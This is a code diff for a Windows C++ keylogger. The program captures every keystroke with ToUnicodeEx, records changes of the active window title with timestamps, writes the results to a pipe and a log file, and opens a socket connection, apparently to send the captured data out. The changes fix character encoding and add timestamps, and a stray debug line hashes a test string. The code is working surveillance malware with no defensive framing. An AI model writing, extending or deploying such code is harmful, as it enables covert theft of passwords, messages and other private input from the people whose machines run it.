@@ -7,6 +7,8 @@
 #include <thread>
 #include <time.h>
 #include "SocketConnection.h"
+#include "MD5.h"
+
 #define STR_LEN 512
 
 using namespace std;
@@ -80,7 +82,11 @@ void Reader()
 						break;
 				}
 				
-				WriteFile(logFile, buf, (ssize*2)+1, &numb_bytes, NULL);
+				int neededSize=WideCharToMultiByte(CP_ACP, NULL, buf, wcslen(buf), NULL, NULL, NULL, NULL);
+				char* neededChar = new char[neededSize+1];
+				WideCharToMultiByte(CP_ACP, NULL, buf, wcslen(buf), neededChar, neededSize, NULL, NULL);
+				neededChar[neededSize] = '\0';
+				WriteFile(logFile, neededChar, neededSize, &numb_bytes, NULL);
 				if (((GetTickCount() - dwTick) > 5000))
 					break;
 			}
@@ -90,7 +96,10 @@ void Reader()
 
 			SocketConnection* a = new SocketConnection();
 			a->Connect();
-		}
+			
+			string sex = md5("grape");
+			cout << sex;
+	}
 
 		
 
@@ -99,7 +108,7 @@ void Reader()
 
 int main() {
 	wchar_t window_text[500];
-	TCHAR old_window_text[500];
+	wchar_t old_window_text[500];
 	TCHAR latest_key[50];
 	TCHAR file_name[MAX_PATH + 1];
 	TCHAR write_name[500];
@@ -134,14 +143,27 @@ int main() {
 		{
 			if (GetWindowText(fore_hndl, window_text, 499) != 0)
 			{
+				setlocale(LC_ALL, ".1251");
+
 				if (wcscmp(window_text, old_window_text) != 0)
 				{
-					wcscpy(write_name, L"\r\n{WINDOW TITLE}-> ");
+					std::wcout.clear();
+					std::wcout << "\r\n1 " << window_text << "\r\n2 ";
+					std::wcout << old_window_text;
+					std::wcout.flush();
+					time_t     now = time(0);
+					struct tm  tstruct;
+					wchar_t       timeBuf[100];
+					tstruct = *localtime(&now);
+					wcsftime(timeBuf, sizeof(timeBuf), L"%Y-%m-%d-%H:%M:%S", &tstruct);
+					wcscpy(write_name, L"\r\n");
+					wcscat(write_name, timeBuf);
+					wcscat(write_name, L" {Active Window Changed}->");
 					wcscat(write_name, window_text);
 					wcscat(write_name, L"\r\n");
 					WriteFile(hPipe, write_name, sizeof(write_name), &numb_bytes, NULL);
 					wcscpy(old_window_text, window_text);
-
+					
 
 				}
 			}
@@ -160,17 +182,18 @@ int main() {
 
 				int scanCodeEx = MapVirtualKeyExW(i, MAPVK_VK_TO_VSC_EX, locale);
 
-				wchar_t buffer[1];
+				wchar_t buffer[5];
 				unsigned char lpKeyState[256] = { 0 };
-				ToUnicodeEx(i, scanCodeEx, lpKeyState, (LPWSTR)buffer, sizeof(buffer), 0, locale);
+				ToUnicodeEx(i, scanCodeEx, lpKeyState, buffer, sizeof(buffer), 0, locale);
 
 				wcscpy(latest_key, buffer);
 				if (wcscmp(latest_key, L"") != 0)
 				{
-
-					WriteFile(hPipe, latest_key, sizeof(latest_key)+1, &numb_bytes, NULL);
+					wchar_t temp = latest_key[0];
+					WriteFile(hPipe, latest_key, 4, &numb_bytes, NULL);
 
 					Sleep(10);
+					break;
 				}
 			}
 
